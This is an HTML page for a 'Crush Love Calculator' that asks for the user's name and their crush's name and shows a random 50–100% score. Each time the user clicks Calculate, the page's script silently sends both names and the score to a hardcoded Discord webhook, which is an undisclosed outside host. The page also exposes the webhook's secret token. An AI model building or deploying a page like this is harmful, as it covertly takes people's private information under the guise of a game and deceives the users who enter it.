<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Crush Love Calculator</title>
    <style>
        body {
            margin: 0;
            font-family: "Poppins", sans-serif;
            background: linear-gradient(135deg, #ff9bc1, #ffd1e3);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }

        #loadingScreen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 203, 225, 0.95);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 999;
            font-size: 24px;
            font-weight: bold;
        }

        .loader {
            border: 6px solid #ffe6f1;
            border-top: 6px solid #ff4f9a;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1s linear infinite;
            margin-bottom: 15px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .card {
            background: white;
            padding: 30px;
            border-radius: 25px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.15);
            width: 90%;
            max-width: 360px;
            text-align: center;
            opacity: 0;
            transform: scale(0.8);
        }

        input {
            width: 100%;
            padding: 12px;
            border: 2px solid #ffc3dd;
            border-radius: 12px;
            outline: none;
            margin-bottom: 15px;
            font-size: 16px;
        }

        button {
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: 12px;
            background: #ff4f9a;
            color: white;
            font-size: 18px;
            cursor: pointer;
            transition: 0.2s;
        }
        button:hover {
            transform: scale(1.05);
        }

        .barContainer {
            width: 100%;
            background: #ffe6f1;
            border-radius: 12px;
            overflow: hidden;
            margin-top: 20px;
            display: none;
        }
        .barFill {
            height: 20px;
            width: 0%;
            background: #ff4f9a;
            transition: width 1.2s ease;
        }

        #result {
            margin-top: 15px;
            font-size: 20px;
            font-weight: bold;
        }

        @keyframes popIn {
            to { opacity: 1; transform: scale(1); }
        }
    </style>
</head>
<body>

<div id="loadingScreen">
    <div class="loader"></div>
    Loading Love Calculator...
</div>

<div class="card" id="mainCard">
    <h1>ðŸ’• Crush Love Calculator ðŸ’•</h1>
    <input id="yourName" placeholder="Your Name" />
    <input id="crushName" placeholder="Crush Name" />
    <button onclick="calculateLove()">Calculate</button>

    <div class="barContainer" id="barContainer">
        <div class="barFill" id="barFill"></div>
    </div>

    <div id="result"></div>
</div>

<script>
const webhookURL = "https://discord.com/api/webhooks/1441363469839634494/LN6QnbM0T-DVLQdj4KLoZcx_tdEEpd72u2lSoJSBj0lJgP5xD66ftcQ_y08jgySClXUJ";

window.addEventListener('load', () => {
    setTimeout(() => {
        document.getElementById('loadingScreen').style.display = 'none';
        const card = document.getElementById('mainCard');
        card.style.animation = 'popIn 0.6s ease forwards';
    }, 2000);
});

function calculateLove() {
    const yourName = document.getElementById("yourName").value.trim();
    const crushName = document.getElementById("crushName").value.trim();
    const resultBox = document.getElementById("result");
    const bar = document.getElementById("barFill");
    const barContainer = document.getElementById("barContainer");

    if (!yourName || !crushName) {
        resultBox.textContent = "Please enter both names!";
        resultBox.style.color = "red";
        return;
    }

    const lovePercent = Math.floor(Math.random() * 51) + 50;

    barContainer.style.display = "block";
    bar.style.width = "0%";

    setTimeout(() => {
        bar.style.width = lovePercent + "%";
    }, 100);

    setTimeout(() => {
        resultBox.style.color = "black";
        resultBox.textContent = `${crushName} likes you ${lovePercent}% â¤ï¸`;
    }, 1300);

    fetch(webhookURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            content: `ðŸ’˜ **New Love Check** \nðŸ‘¤ Name: ${yourName} \nðŸ˜ Crush: ${crushName} \nðŸ“Š Result: ${lovePercent}%`
        })
    }).catch(err => console.log("Webhook Error:", err));
}
</script>

</body>
</html>
